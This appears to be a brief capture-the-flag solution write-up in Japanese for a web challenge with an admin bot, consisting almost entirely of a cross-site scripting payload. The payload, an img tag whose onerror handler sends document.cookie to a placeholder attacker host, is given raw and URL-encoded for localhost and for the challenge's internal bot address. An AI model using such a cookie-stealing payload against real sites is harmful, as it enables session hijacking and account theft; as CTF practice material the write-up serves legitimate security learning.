# Solution

ローカルでの動作確認

```html
<img src=x onerror="location.href=[`https://[your.example.com]/?q=`, document.cookie]"/>
```

```
http://localhost:3000/?name=%3Cimg%20src%3Dx%20onerror%3D%22location.href%3D%5B%60https%3A%2F%2F%5Byour.example.com%5D%2F%3Fq%3D%60%2C%20document.cookie%5D%22%2F%3E
```

Admin Botに以下を入力

```
http://web:3000/?name=%3Cimg%20src%3Dx%20onerror%3D%22location.href%3D%5B%60https%3A%2F%2F%5Byour.example.com%5D%2F%3Fq%3D%60%2C%20document.cookie%5D%22%2F%3E
```
